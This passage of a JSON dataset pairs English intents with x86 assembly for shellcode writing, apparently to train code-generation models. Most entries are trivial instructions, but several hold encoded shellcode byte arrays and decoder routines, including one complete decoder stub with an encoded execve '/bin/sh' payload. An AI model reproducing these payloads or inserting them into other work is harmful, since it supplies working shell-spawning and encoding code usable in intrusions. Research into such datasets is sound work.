    "slot_map": {
      "decoder": "var0",
      "esi": "var1"
    },
    "intent_tokens": [
      "in",
      "var0",
      "routine",
      "save",
      "shellcode",
      "var1"
    ],
    "snippet_tokens": [
      "var0",
      ":",
      "\\n",
      "pop",
      "var1"
    ]
  },
  {
    "intent": "in decoder save the shellcode in esi and move it to edi",
    "rewritten_intent": "in decoder save the shellcode in esi and move it to edi",
    "snippet": "decoder: \\n pop esi \\n mov edi, esi",
    "slot_map": {
      "esi": "var0",
      "edi": "var1"
    },
    "intent_tokens": [
      "in",
      "decoder",
      "save",
      "shellcode",
      "var0",
      "and",
      "move",
      "it",
      "var1"
    ],
    "snippet_tokens": [
      "decoder",
      ":",
      "\\n",
      "pop",
      "var0",
      "\\n",
      "mov",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "define enc function and call decoder",
    "rewritten_intent": "define enc function and call decoder",
    "snippet": "enc: \\n call decoder",
    "slot_map": {
      "enc": "var0"
    },
    "intent_tokens": [
      "define",
      "var0",
      "function",
      "and",
      "call",
      "decoder"
    ],
    "snippet_tokens": [
      "var0",
      ":",
      "\\n",
      "call",
      "decoder"
    ]
  },
  {
    "intent": "encoded_shellcode is an array of bytes 0xc0, 0x31, 0x68, 0x50, 0x2f, 0x2f, 0x68, 0x73, 0x2f, 0x68, 0x69, 0x62, 0x87, 0x6e, 0xb0, 0xe3, 0xcd, 0x0b, 0x90, 0x80",
    "rewritten_intent": "encoded_shellcode is an array of bytes 0xc0, 0x31, 0x68, 0x50, 0x2f, 0x2f, 0x68, 0x73, 0x2f, 0x68, 0x69, 0x62, 0x87, 0x6e, 0xb0, 0xe3, 0xcd, 0x0b, 0x90, 0x80",
    "snippet": "encoded_shellcode: db 0xc0, 0x31, 0x68, 0x50, 0x2f, 0x2f, 0x68, 0x73, 0x2f, 0x68, 0x69, 0x62, 0x87, 0x6e, 0xb0, 0xe3, 0xcd, 0x0b, 0x90, 0x80",
    "slot_map": {
      "0xc0, 0x31, 0x68, 0x50, 0x2f, 0x2f, 0x68, 0x73, 0x2f, 0x68, 0x69, 0x62, 0x87, 0x6e, 0xb0, 0xe3, 0xcd, 0x0b, 0x90, 0x80": "var1",
      "encoded_shellcode": "var0"
    },
    "intent_tokens": [
      "var0",
      "array",
      "bytes",
      "var1"
    ],
    "snippet_tokens": [
      "var0",
      ":",
      "db",
      "var1"
    ]
  },
  {
    "intent": "define encoded_shellcode as array of words 0x545, 0x4a3, 0x583, 0x5d3, 0x541, 0x541, 0x439, 0x5d3, 0x5d3, 0x541, 0x5e7, 0x5d5, 0x5cf, 0x411, 0x4eb, 0x443, 0x509, 0x48d, 0x423, 0x539",
    "rewritten_intent": "define encoded_shellcode as array of words 0x545, 0x4a3, 0x583, 0x5d3, 0x541, 0x541, 0x439, 0x5d3, 0x5d3, 0x541, 0x5e7, 0x5d5, 0x5cf, 0x411, 0x4eb, 0x443, 0x509, 0x48d, 0x423, 0x539",
    "snippet": "encoded_shellcode: dw 0x545, 0x4a3, 0x583, 0x5d3, 0x541, 0x541, 0x439, 0x5d3, 0x5d3, 0x541, 0x5e7, 0x5d5, 0x5cf, 0x411, 0x4eb, 0x443, 0x509, 0x48d, 0x423, 0x539",
    "slot_map": {
      "encoded_shellcode": "var0",
      "0x545, 0x4a3, 0x583, 0x5d3, 0x541, 0x541, 0x439, 0x5d3, 0x5d3, 0x541, 0x5e7, 0x5d5, 0x5cf, 0x411, 0x4eb, 0x443, 0x509, 0x48d, 0x423, 0x539": "var1",
      "0x583": "var2",
      "0x5d5": "var3",
      "0x4eb": "var4",
      "0x509": "var5",
      "0x423": "var6",
      "0x539": "var7"
    },
    "intent_tokens": [
      "define",
      "var0",
      "array",
      "words",
      "var1"
    ],
    "snippet_tokens": [
      "var0",
      ":",
      "dw",
      "var1"
    ]
  },
  {
    "intent": "encoded is the array of bytes 0xaa,0x62,0xc0,0xaa,0xa0,0xaa,0xd0,0xaa,0x5e,0xaa,0x5e,0xaa,0xe6,0xaa,0xd0,0xaa,0xd0,0xaa,0x5e,0xaa,0xc4,0xaa,0xd2,0xaa,0xdc,0x89,0xe3,0xaa,0xa0,0x89,0xe2,0xaa,0xa6,0x89,0xe1,0xb0,0xaa,0x16,0xcd,0x80,0xbb",
    "rewritten_intent": "encoded is the array of bytes 0xaa,0x62,0xc0,0xaa,0xa0,0xaa,0xd0,0xaa,0x5e,0xaa,0x5e,0xaa,0xe6,0xaa,0xd0,0xaa,0xd0,0xaa,0x5e,0xaa,0xc4,0xaa,0xd2,0xaa,0xdc,0x89,0xe3,0xaa,0xa0,0x89,0xe2,0xaa,0xa6,0x89,0xe1,0xb0,0xaa,0x16,0xcd,0x80,0xbb",
    "snippet": "encoded: db 0xaa,0x62,0xc0,0xaa,0xa0,0xaa,0xd0,0xaa,0x5e,0xaa,0x5e,0xaa,0xe6,0xaa,0xd0,0xaa,0xd0,0xaa,0x5e,0xaa,0xc4,0xaa,0xd2,0xaa,0xdc,0x89,0xe3,0xaa,0xa0,0x89,0xe2,0xaa,0xa6,0x89,0xe1,0xb0,0xaa,0x16,0xcd,0x80,0xbb",
    "slot_map": {
      "0xaa,0x62,0xc0,0xaa,0xa0,0xaa,0xd0,0xaa,0x5e,0xaa,0x5e,0xaa,0xe6,0xaa,0xd0,0xaa,0xd0,0xaa,0x5e,0xaa,0xc4,0xaa,0xd2,0xaa,0xdc,0x89,0xe3,0xaa,0xa0,0x89,0xe2,0xaa,0xa6,0x89,0xe1,0xb0,0xaa,0x16,0xcd,0x80,0xbb": "var0"
    },
    "intent_tokens": [
      "encoded",
      "array",
      "bytes",
      "var0"
    ],
    "snippet_tokens": [
      "encoded",
      ":",
      "db",
      "var0"
    ]
  },
  {
    "intent": "define encoded as array of words 0x04, 0x539, 0x9d9, 0x6c9, 0xfc9, 0xc49, 0xc29, 0x839, 0xdf9, 0xc49, 0xc49, 0x839, 0x839, 0xce9, 0xc59, 0x259, 0x4f9, 0xfc9, 0x259, 0x4e9, 0xff9, 0x259, 0x4d9, 0x1c9, 0xa79, 0x619, 0x2c9, 0x539",
    "rewritten_intent": "define encoded as array of words 0x04, 0x539, 0x9d9, 0x6c9, 0xfc9, 0xc49, 0xc29, 0x839, 0xdf9, 0xc49, 0xc49, 0x839, 0x839, 0xce9, 0xc59, 0x259, 0x4f9, 0xfc9, 0x259, 0x4e9, 0xff9, 0x259, 0x4d9, 0x1c9, 0xa79, 0x619, 0x2c9, 0x539",
    "snippet": "encoded: dw 0x04, 0x539, 0x9d9, 0x6c9, 0xfc9, 0xc49, 0xc29, 0x839, 0xdf9, 0xc49, 0xc49, 0x839, 0x839, 0xce9, 0xc59, 0x259, 0x4f9, 0xfc9, 0x259, 0x4e9, 0xff9, 0x259, 0x4d9, 0x1c9, 0xa79, 0x619, 0x2c9, 0x539",
    "slot_map": {
      "0x04, 0x539, 0x9d9, 0x6c9, 0xfc9, 0xc49, 0xc29, 0x839, 0xdf9, 0xc49, 0xc49, 0x839, 0x839, 0xce9, 0xc59, 0x259, 0x4f9, 0xfc9, 0x259, 0x4e9, 0xff9, 0x259, 0x4d9, 0x1c9, 0xa79, 0x619, 0x2c9, 0x539": "var0"
    },
    "intent_tokens": [
      "define",
      "encoded",
      "array",
      "words",
      "var0"
    ],
    "snippet_tokens": [
      "encoded",
      ":",
      "dw",
      "var0"
    ]
  },
  {
    "intent": "define the array of bytes encodedshellcode and initialize to \\xeb\\x1d\\x5e\\x8d\\x7e\\x01\\x31\\xc0\\xb0\\x01\\x31\\xdb\\x8a\\x1c\\x06\\x80\\xf3\\xaa\\x75\\x10\\x8a\\x5c\\x06\\x01\\x88\\x1f\\x47\\x04\\x02\\xeb\\xed\\xe8\\xde\\xff\\xff\\xff\\x31\\xaa\\xc0\\xaa\\x50\\xaa\\x68\\xaa\\x2f\\xaa\\x2f\\xaa\\x73\\xaa\\x68\\xaa\\x68\\xaa\\x2f\\xaa\\x62\\xaa\\x69\\xaa\\x6e\\xaa\\x89\\xaa\\xe3\\xaa\\x50\\xaa\\x89\\xaa\\xe2\\xaa\\x53\\xaa\\x89\\xaa\\xe1\\xaa\\xb0\\xaa\\x0b\\xaa\\xcd\\xaa\\x80\\xaa\\xbb\\xbb",
    "rewritten_intent": "define the array of bytes encodedshellcode and initialize to \\xeb\\x1d\\x5e\\x8d\\x7e\\x01\\x31\\xc0\\xb0\\x01\\x31\\xdb\\x8a\\x1c\\x06\\x80\\xf3\\xaa\\x75\\x10\\x8a\\x5c\\x06\\x01\\x88\\x1f\\x47\\x04\\x02\\xeb\\xed\\xe8\\xde\\xff\\xff\\xff\\x31\\xaa\\xc0\\xaa\\x50\\xaa\\x68\\xaa\\x2f\\xaa\\x2f\\xaa\\x73\\xaa\\x68\\xaa\\x68\\xaa\\x2f\\xaa\\x62\\xaa\\x69\\xaa\\x6e\\xaa\\x89\\xaa\\xe3\\xaa\\x50\\xaa\\x89\\xaa\\xe2\\xaa\\x53\\xaa\\x89\\xaa\\xe1\\xaa\\xb0\\xaa\\x0b\\xaa\\xcd\\xaa\\x80\\xaa\\xbb\\xbb",
    "snippet": "encodedshellcode: db \\xeb\\x1d\\x5e\\x8d\\x7e\\x01\\x31\\xc0\\xb0\\x01\\x31\\xdb\\x8a\\x1c\\x06\\x80\\xf3\\xaa\\x75\\x10\\x8a\\x5c\\x06\\x01\\x88\\x1f\\x47\\x04\\x02\\xeb\\xed\\xe8\\xde\\xff\\xff\\xff\\x31\\xaa\\xc0\\xaa\\x50\\xaa\\x68\\xaa\\x2f\\xaa\\x2f\\xaa\\x73\\xaa\\x68\\xaa\\x68\\xaa\\x2f\\xaa\\x62\\xaa\\x69\\xaa\\x6e\\xaa\\x89\\xaa\\xe3\\xaa\\x50\\xaa\\x89\\xaa\\xe2\\xaa\\x53\\xaa\\x89\\xaa\\xe1\\xaa\\xb0\\xaa\\x0b\\xaa\\xcd\\xaa\\x80\\xaa\\xbb\\xbb",
    "slot_map": {
      " \\xeb\\x1d\\x5e\\x8d\\x7e\\x01\\x31\\xc0\\xb0\\x01\\x31\\xdb\\x8a\\x1c\\x06\\x80\\xf3\\xaa\\x75\\x10\\x8a\\x5c\\x06\\x01\\x88\\x1f\\x47\\x04\\x02\\xeb\\xed\\xe8\\xde\\xff\\xff\\xff\\x31\\xaa\\xc0\\xaa\\x50\\xaa\\x68\\xaa\\x2f\\xaa\\x2f\\xaa\\x73\\xaa\\x68\\xaa\\x68\\xaa\\x2f\\xaa\\x62\\xaa\\x69\\xaa\\x6e\\xaa\\x89\\xaa\\xe3\\xaa\\x50\\xaa\\x89\\xaa\\xe2\\xaa\\x53\\xaa\\x89\\xaa\\xe1\\xaa\\xb0\\xaa\\x0b\\xaa\\xcd\\xaa\\x80\\xaa\\xbb\\xbb": "var1",
      "encodedshellcode": "var0"
    },
    "intent_tokens": [
      "define",
      "array",
      "bytes",
      "var0",
      "and",
      "initialize",
      "tovar1"
    ],
    "snippet_tokens": [
      "var0",
      ":",
      "dbvar1"
    ]
  },
  {
    "intent": "define the array of bytes encodedshellcode and initialize to 0x32,0x51,0x30,0x74,0x69,0x63,0x6f,0xe4,0x8a,0x54,0xe2,0x0c,0x81,0xc1,0x69,0x30,0x69,0x30,0x6a,0x8a,0x51,0xe3,0x8a,0xb1,0xce",
    "rewritten_intent": "define the array of bytes encodedshellcode and initialize to 0x32,0x51,0x30,0x74,0x69,0x63,0x6f,0xe4,0x8a,0x54,0xe2,0x0c,0x81,0xc1,0x69,0x30,0x69,0x30,0x6a,0x8a,0x51,0xe3,0x8a,0xb1,0xce",
    "snippet": "encodedshellcode: db 0x32,0x51,0x30,0x74,0x69,0x63,0x6f,0xe4,0x8a,0x54,0xe2,0x0c,0x81,0xc1,0x69,0x30,0x69,0x30,0x6a,0x8a,0x51,0xe3,0x8a,0xb1,0xce",
    "slot_map": {
      "0x32,0x51,0x30,0x74,0x69,0x63,0x6f,0xe4,0x8a,0x54,0xe2,0x0c,0x81,0xc1,0x69,0x30,0x69,0x30,0x6a,0x8a,0x51,0xe3,0x8a,0xb1,0xce": "var1",
      "encodedshellcode": "var0"
    },
    "intent_tokens": [
      "define",
      "array",
      "bytes",
      "var0",
      "and",
      "initialize",
      "var1"
    ],
    "snippet_tokens": [
      "var0",
      ":",
      "db",
      "var1"
    ]
  },
  {
    "intent": "encodedshellcode is the array of bytes 0x43,0xed,0x1d,0xf4,0x40,0xfb,0x6f,0x7a,0xa9,0xe,0xb6,0xe,0xbc,0xc9,0xe3,0x7a,0xaf,0x7a,0x78,0xe,0xc5,0xda,0x76,0x6a,0x17,0x1a,0x4e,0x68,0x38,0xc2,0x99,0xfb,0x35,0x68,0x84,0xd2,0xb3,0xcb,0x7c,0x68,0x78,0xe2,0x9a,0xf5,0xe9,0x50,0xc0,0x24,0x91,0xf8,0xfe",
    "rewritten_intent": "encodedshellcode is the array of bytes 0x43,0xed,0x1d,0xf4,0x40,0xfb,0x6f,0x7a,0xa9,0xe,0xb6,0xe,0xbc,0xc9,0xe3,0x7a,0xaf,0x7a,0x78,0xe,0xc5,0xda,0x76,0x6a,0x17,0x1a,0x4e,0x68,0x38,0xc2,0x99,0xfb,0x35,0x68,0x84,0xd2,0xb3,0xcb,0x7c,0x68,0x78,0xe2,0x9a,0xf5,0xe9,0x50,0xc0,0x24,0x91,0xf8,0xfe",
    "snippet": "encodedshellcode: db 0x43,0xed,0x1d,0xf4,0x40,0xfb,0x6f,0x7a,0xa9,0xe,0xb6,0xe,0xbc,0xc9,0xe3,0x7a,0xaf,0x7a,0x78,0xe,0xc5,0xda,0x76,0x6a,0x17,0x1a,0x4e,0x68,0x38,0xc2,0x99,0xfb,0x35,0x68,0x84,0xd2,0xb3,0xcb,0x7c,0x68,0x78,0xe2,0x9a,0xf5,0xe9,0x50,0xc0,0x24,0x91,0xf8,0xfe",
    "slot_map": {
      "0x43,0xed,0x1d,0xf4,0x40,0xfb,0x6f,0x7a,0xa9,0xe,0xb6,0xe,0xbc,0xc9,0xe3,0x7a,0xaf,0x7a,0x78,0xe,0xc5,0xda,0x76,0x6a,0x17,0x1a,0x4e,0x68,0x38,0xc2,0x99,0xfb,0x35,0x68,0x84,0xd2,0xb3,0xcb,0x7c,0x68,0x78,0xe2,0x9a,0xf5,0xe9,0x50,0xc0,0x24,0x91,0xf8,0xfe": "var1",
      "encodedshellcode": "var0"
    },
    "intent_tokens": [
      "var0",
      "array",
      "bytes",
      "var1"
    ],
    "snippet_tokens": [
      "var0",
      ":",
      "db",
      "var1"
    ]
  },
  {
    "intent": "define the array of bytes encodedshellcode and initialize it to 0xd6,0x47,0xb7,0x9f,0xd8,0xd8,0x94,0x9f,0x9f,0xd8,0xa5,0x9e,0x99,0x7e,0x24,0xb7,0x7e,0x25,0xb4,0x7e,0x26,0x57,0xfc,0x3a,0x87",
    "rewritten_intent": "define the array of bytes encodedshellcode and initialize it to 0xd6,0x47,0xb7,0x9f,0xd8,0xd8,0x94,0x9f,0x9f,0xd8,0xa5,0x9e,0x99,0x7e,0x24,0xb7,0x7e,0x25,0xb4,0x7e,0x26,0x57,0xfc,0x3a,0x87",
    "snippet": "encodedshellcode: db 0xd6,0x47,0xb7,0x9f,0xd8,0xd8,0x94,0x9f,0x9f,0xd8,0xa5,0x9e,0x99,0x7e,0x24,0xb7,0x7e,0x25,0xb4,0x7e,0x26,0x57,0xfc,0x3a,0x87",
    "slot_map": {
      "0xd6,0x47,0xb7,0x9f,0xd8,0xd8,0x94,0x9f,0x9f,0xd8,0xa5,0x9e,0x99,0x7e,0x24,0xb7,0x7e,0x25,0xb4,0x7e,0x26,0x57,0xfc,0x3a,0x87": "var1",
      "encodedshellcode": "var0"
    },
    "intent_tokens": [
      "define",
      "array",
      "bytes",
      "var0",
      "and",
      "initialize",
      "it",
      "var1"
    ],
    "snippet_tokens": [
      "var0",
      ":",
      "db",
      "var1"
    ]
  },
  {
    "intent": "define the array of bytes encodedshellcode and initialize it to 0xeb,0x0c,0x5e,0x31,0xc9,0xb1,0x19,0xf6,0x16,0x46,0xe2,0xfb,0xeb,0x05,0xe8,0xef,0xff,0xff,0xff,0xce,0x3f,0xaf,0x97,0xd0,0xd0,0x8c,0x97,0x97,0xd0,0x9d,0x96,0x91,0x76,0x1c,0xaf,0x76,0x1d,0xac,0x76,0x1e,0x4f,0xf4,0x32,0x7f",
    "rewritten_intent": "define the array of bytes encodedshellcode and initialize it to 0xeb,0x0c,0x5e,0x31,0xc9,0xb1,0x19,0xf6,0x16,0x46,0xe2,0xfb,0xeb,0x05,0xe8,0xef,0xff,0xff,0xff,0xce,0x3f,0xaf,0x97,0xd0,0xd0,0x8c,0x97,0x97,0xd0,0x9d,0x96,0x91,0x76,0x1c,0xaf,0x76,0x1d,0xac,0x76,0x1e,0x4f,0xf4,0x32,0x7f",
    "snippet": "encodedshellcode: db 0xeb,0x0c,0x5e,0x31,0xc9,0xb1,0x19,0xf6,0x16,0x46,0xe2,0xfb,0xeb,0x05,0xe8,0xef,0xff,0xff,0xff,0xce,0x3f,0xaf,0x97,0xd0,0xd0,0x8c,0x97,0x97,0xd0,0x9d,0x96,0x91,0x76,0x1c,0xaf,0x76,0x1d,0xac,0x76,0x1e,0x4f,0xf4,0x32,0x7f",
    "slot_map": {
      "0xeb,0x0c,0x5e,0x31,0xc9,0xb1,0x19,0xf6,0x16,0x46,0xe2,0xfb,0xeb,0x05,0xe8,0xef,0xff,0xff,0xff,0xce,0x3f,0xaf,0x97,0xd0,0xd0,0x8c,0x97,0x97,0xd0,0x9d,0x96,0x91,0x76,0x1c,0xaf,0x76,0x1d,0xac,0x76,0x1e,0x4f,0xf4,0x32,0x7f": "var1",
      "encodedshellcode": "var0"
    },
    "intent_tokens": [
      "define",
      "array",
      "bytes",
      "var0",
      "and",
      "initialize",
      "it",
      "var1"
    ],
    "snippet_tokens": [
      "var0",
      ":",
      "db",
      "var1"
    ]
  },
  {
    "intent": "encoder_shellcode is the array of bytes 0x08,0x60,0x58,0xc8,0x39,0xb0,0xd8,0xc3,0x9f,0x9f,0xd1,0xb8,0xb3,0xfe,0xb9,0x1e,0x4e,0xfd,0x97,0x70,0x39,0xb0,0x6a,0xdb,0xb0,0xc4,0x09,0xcf,0x74,0x25,0x76,0xe6,0xe6,0xe6,0xf6,0x90,0x90,0xaa,0xaa",
    "rewritten_intent": "encoder_shellcode is the array of bytes 0x08,0x60,0x58,0xc8,0x39,0xb0,0xd8,0xc3,0x9f,0x9f,0xd1,0xb8,0xb3,0xfe,0xb9,0x1e,0x4e,0xfd,0x97,0x70,0x39,0xb0,0x6a,0xdb,0xb0,0xc4,0x09,0xcf,0x74,0x25,0x76,0xe6,0xe6,0xe6,0xf6,0x90,0x90,0xaa,0xaa",
    "snippet": "encoder_shellcode: db 0x08,0x60,0x58,0xc8,0x39,0xb0,0xd8,0xc3,0x9f,0x9f,0xd1,0xb8,0xb3,0xfe,0xb9,0x1e,0x4e,0xfd,0x97,0x70,0x39,0xb0,0x6a,0xdb,0xb0,0xc4,0x09,0xcf,0x74,0x25,0x76,0xe6,0xe6,0xe6,0xf6,0x90,0x90,0xaa,0xaa",
    "slot_map": {
      "0x08,0x60,0x58,0xc8,0x39,0xb0,0xd8,0xc3,0x9f,0x9f,0xd1,0xb8,0xb3,0xfe,0xb9,0x1e,0x4e,0xfd,0x97,0x70,0x39,0xb0,0x6a,0xdb,0xb0,0xc4,0x09,0xcf,0x74,0x25,0x76,0xe6,0xe6,0xe6,0xf6,0x90,0x90,0xaa,0xaa": "var1",
      "encoder_shellcode": "var0"
    },
    "intent_tokens": [
      "var0",
      "array",
      "bytes",
      "var1"
    ],
    "snippet_tokens": [
      "var0",
      ":",
      "db",
      "var1"
    ]
  },
  {
    "intent": "define even_number",
    "rewritten_intent": "define even_number",
    "snippet": "even_number:",
    "slot_map": {
      "even_number": "var0"
    },
    "intent_tokens": [
      "define",
      "var0"
    ],
    "snippet_tokens": [
      "var0",
      ":"
    ]
  },
  {
    "intent": "in execute_shellcode jump short to esp",
    "rewritten_intent": "in execute_shellcode jump short to esp",
    "snippet": "execute_shellcode: \\n jmp short esp",
    "slot_map": {
      "execute_shellcode": "var0"
    },
    "intent_tokens": [
      "in",
      "var0",
      "jump",
      "short",
      "esp"
    ],
    "snippet_tokens": [
      "var0",
      ":",
      "\\n",
      "jmp",
      "short",
      "esp"
    ]
  },
  {
    "intent": "define format routine",
    "rewritten_intent": "define format routine",
    "snippet": "format:",
    "slot_map": {
      "format": "var0"
    },
    "intent_tokens": [
      "define",
      "var0",
      "routine"
    ],
    "snippet_tokens": [
      "var0",
      ":"
    ]
  },
  {
    "intent": "formatting label",
    "rewritten_intent": "formatting label",
    "snippet": "formatting:",
    "slot_map": {},
    "intent_tokens": [
      "formatting",
      "label"
    ],
    "snippet_tokens": [
      "formatting",
      ":"
    ]
  },
  {
    "intent": "get_shellcode_addr function",
    "rewritten_intent": "get_shellcode_addr function",
    "snippet": "get_shellcode_addr:",
    "slot_map": {
      "get_shellcode_addr": "var0"
    },
    "intent_tokens": [
      "var0",
      "function"
    ],
    "snippet_tokens": [
      "var0",
      ":"
    ]
  },
  {
    "intent": "declare the global _start label",
    "rewritten_intent": "declare the global _start label",
    "snippet": "global _start:",
    "slot_map": {
      "_start": "var0"
    },
    "intent_tokens": [
      "declare",
      "global",
      "var0",
      "label"
    ],
    "snippet_tokens": [
      "global",
      "var0",
      ":"
    ]
  },
  {
    "intent": "global _start",
    "rewritten_intent": "global _start",
    "snippet": "global _start:",
    "slot_map": {
      "_start": "var0"
    },
    "intent_tokens": [
      "global",
      "var0"
    ],
    "snippet_tokens": [
      "global",
      "var0",
      ":"
    ]
  },
  {
    "intent": "increment dx by one",
    "rewritten_intent": "increment dx by one",
    "snippet": "inc dx",
    "slot_map": {
      "dx": "var0"
    },
    "intent_tokens": [
      "increment",
      "var0",
      "one"
    ],
    "snippet_tokens": [
      "inc",
      "var0"
    ]
  },
  {
    "intent": "point to the next byte in eax",
    "rewritten_intent": "point to the next byte in eax",
    "snippet": "inc eax",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "point",
      "next",
      "byte",
      "var0"
    ],
    "snippet_tokens": [
      "inc",
      "var0"
    ]
  },
  {
    "intent": "point to the next byte in the eax register",
    "rewritten_intent": "point to the next byte in the eax register",
    "snippet": "inc eax",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "point",
      "next",
      "byte",
      "var0",
      "register"
    ],
    "snippet_tokens": [
      "inc",
      "var0"
    ]
  },
  {
    "intent": "point to the next position in ecx",
    "rewritten_intent": "point to the next position in ecx",
    "snippet": "inc ecx",
    "slot_map": {
      "ecx": "var0"
    },
    "intent_tokens": [
      "point",
      "next",
      "position",
      "var0"
    ],
    "snippet_tokens": [
      "inc",
      "var0"
    ]
  },
  {
    "intent": "point to the next byte in ecx",
    "rewritten_intent": "point to the next byte in ecx",
    "snippet": "inc ecx",
    "slot_map": {
      "ecx": "var0"
    },
    "intent_tokens": [
      "point",
      "next",
      "byte",
      "var0"
    ],
    "snippet_tokens": [
      "inc",
      "var0"
    ]
  },
  {
    "intent": "point to the next byte in edi",
    "rewritten_intent": "point to the next byte in edi",
    "snippet": "inc edi",
    "slot_map": {
      "edi": "var0"
    },
    "intent_tokens": [
      "point",
      "next",
      "byte",
      "var0"
    ],
    "snippet_tokens": [
      "inc",
      "var0"
    ]
  },
  {
    "intent": "increment edi",
    "rewritten_intent": "increment edi",
    "snippet": "inc edi",
    "slot_map": {
      "edi": "var0"
    },
    "intent_tokens": [
      "increment",
      "var0"
    ],
    "snippet_tokens": [
      "inc",
      "var0"
    ]
  },
  {
    "intent": "point to the next byte in edx",
    "rewritten_intent": "point to the next byte in edx",
    "snippet": "inc edx",
    "slot_map": {
      "edx": "var0"
    },
    "intent_tokens": [
      "point",
      "next",
      "byte",
      "var0"
    ],
    "snippet_tokens": [
      "inc",
      "var0"
    ]
  },
  {
    "intent": "point to the next double word in edx",
    "rewritten_intent": "point to the next double word in edx",
    "snippet": "inc edx \\n inc edx \\n inc edx \\n inc edx",
    "slot_map": {
      "edx": "var0"
    },
    "intent_tokens": [
      "point",
      "next",
      "double",
      "word",
      "var0"
    ],
    "snippet_tokens": [
      "inc",
      "var0",
      "\\n",
      "inc",
      "var0",
      "\\n",
      "inc",
      "var0",
      "\\n",
      "inc",
      "var0"
    ]
  },
  {
    "intent": "point to the next byte in esi",
    "rewritten_intent": "point to the next byte in esi",
    "snippet": "inc esi",
    "slot_map": {
      "esi": "var0"
    },
    "intent_tokens": [
      "point",
      "next",
      "byte",
      "var0"
    ],
    "snippet_tokens": [
      "inc",
      "var0"
    ]
  },
  {
    "intent": "next byte in the encoded shellcode",
    "rewritten_intent": "next byte in the encoded shellcode",
    "snippet": "inc esi",
    "slot_map": {},
    "intent_tokens": [
      "next",
      "byte",
      "encoded",
      "shellcode"
    ],
    "snippet_tokens": [
      "inc",
      "esi"
    ]
  },
  {
    "intent": "point to the next byte of the shellcode",
    "rewritten_intent": "point to the next byte of the shellcode",
    "snippet": "inc esi",
    "slot_map": {},
    "intent_tokens": [
      "point",
      "next",
      "byte",
      "shellcode"
    ],
    "snippet_tokens": [
      "inc",
      "esi"
    ]
  },
  {
    "intent": "move to next byte in esi",
    "rewritten_intent": "move to next byte in esi",
    "snippet": "inc esi",
    "slot_map": {
      "esi": "var0"
    },
    "intent_tokens": [
      "move",
      "next",
      "byte",
      "var0"
    ],
    "snippet_tokens": [
      "inc",
      "var0"
    ]
  },
  {
    "intent": "point to the next word in esi",
    "rewritten_intent": "point to the next word in esi",
    "snippet": "inc esi \\n inc esi",
    "slot_map": {
      "esi": "var0"
    },
    "intent_tokens": [
      "point",
      "next",
      "word",
      "var0"
    ],
    "snippet_tokens": [
      "inc",
      "var0",
      "\\n",
      "inc",
      "var0"
    ]
  },
  {
    "intent": "point to the next word of the encoded shellcode",
    "rewritten_intent": "point to the next word of the encoded shellcode",
    "snippet": "inc esi \\n inc esi",
    "slot_map": {},
    "intent_tokens": [
      "point",
      "next",
      "word",
      "encoded",
      "shellcode"
    ],
    "snippet_tokens": [
      "inc",
      "esi",
      "\\n",
      "inc",
      "esi"
    ]
  },
  {
    "intent": "point to the next byte of the shellcode and jump short to decode",
    "rewritten_intent": "point to the next byte of the shellcode and jump short to decode",
    "snippet": "inc esi \\n jmp short decode",
    "slot_map": {},
    "intent_tokens": [
      "point",
      "next",
      "byte",
      "shellcode",
      "and",
      "jump",
      "short",
      "decode"
    ],
    "snippet_tokens": [
      "inc",
      "esi",
      "\\n",
      "jmp",
      "short",
      "decode"
    ]
  },
  {
    "intent": "define inc_dec",
    "rewritten_intent": "define inc_dec",
    "snippet": "inc_dec:",
    "slot_map": {
      "inc_dec": "var0"
    },
    "intent_tokens": [
      "define",
      "var0"
    ],
    "snippet_tokens": [
      "var0",
      ":"
    ]
  },
  {
    "intent": "jump to decode",
    "rewritten_intent": "jump to decode",
    "snippet": "jmp decode",
    "slot_map": {},
    "intent_tokens": [
      "jump",
      "decode"
    ],
    "snippet_tokens": [
      "jmp",
      "decode"
    ]
  },
  {
    "intent": "jump short to call_decoder",
    "rewritten_intent": "jump short to call_decoder",
    "snippet": "jmp short call_decoder",
    "slot_map": {
      "call_decoder": "var0"
    },
    "intent_tokens": [
      "jump",
      "short",
      "var0"
    ],
    "snippet_tokens": [
      "jmp",
      "short",
      "var0"
    ]
  },
  {
    "intent": "go to call_shellcode",
    "rewritten_intent": "go to call_shellcode",
    "snippet": "jmp short call_shellcode",
    "slot_map": {
      "call_shellcode": "var0"
    },
    "intent_tokens": [
      "go",
      "var0"
    ],
    "snippet_tokens": [
      "jmp",
      "short",
      "var0"
    ]
  },
  {
    "intent": "jump short to call_shellcode",
    "rewritten_intent": "jump short to call_shellcode",
    "snippet": "jmp short call_shellcode",
    "slot_map": {
      "call_shellcode": "var0"
    },
    "intent_tokens": [
      "jump",
      "short",
      "var0"
    ],
    "snippet_tokens": [
      "jmp",
      "short",
      "var0"
    ]
  },
  {
    "intent": "jump short to cycle",
    "rewritten_intent": "jump short to cycle",
    "snippet": "jmp short cycle",
    "slot_map": {},
    "intent_tokens": [
      "jump",
      "short",
      "cycle"
    ],
    "snippet_tokens": [
      "jmp",
      "short",
      "cycle"
    ]
  },
  {
    "intent": "jump short to the label decode",
    "rewritten_intent": "jump short to the label decode",
    "snippet": "jmp short decode",
    "slot_map": {},
    "intent_tokens": [
      "jump",
      "short",
      "label",
      "decode"
    ],
    "snippet_tokens": [
      "jmp",
      "short",
      "decode"
    ]
  },
  {
    "intent": "jump short to decode",
    "rewritten_intent": "jump short to decode",
    "snippet": "jmp short decode",
    "slot_map": {},
    "intent_tokens": [
      "jump",
      "short",
      "decode"
    ],
    "snippet_tokens": [
      "jmp",
      "short",
      "decode"
    ]
  },
  {
    "intent": "jump back to start of decode",
    "rewritten_intent": "jump back to start of decode",
    "snippet": "jmp short decode",
    "slot_map": {},
    "intent_tokens": [
      "jump",
      "back",
      "start",
      "decode"
    ],
    "snippet_tokens": [
      "jmp",
      "short",
      "decode"
    ]
  },
  {
    "intent": "goto the decode_pr to decode the next bytes",
    "rewritten_intent": "goto the decode_pr to decode the next bytes",
    "snippet": "jmp short decode_pr",
    "slot_map": {
      "decode_pr": "var1",
      "goto": "var0"
    },
    "intent_tokens": [
      "var0",
      "var1",
      "decode",
      "next",
      "bytes"
    ],
    "snippet_tokens": [
      "jmp",
      "short",
      "var1"
    ]
  },
  {
    "intent": "jump short to get_shellcode_addr",
    "rewritten_intent": "jump short to get_shellcode_addr",
    "snippet": "jmp short get_shellcode_addr",
    "slot_map": {
      "get_shellcode_addr": "var0"
    },
    "intent_tokens": [
      "jump",
      "short",
      "var0"
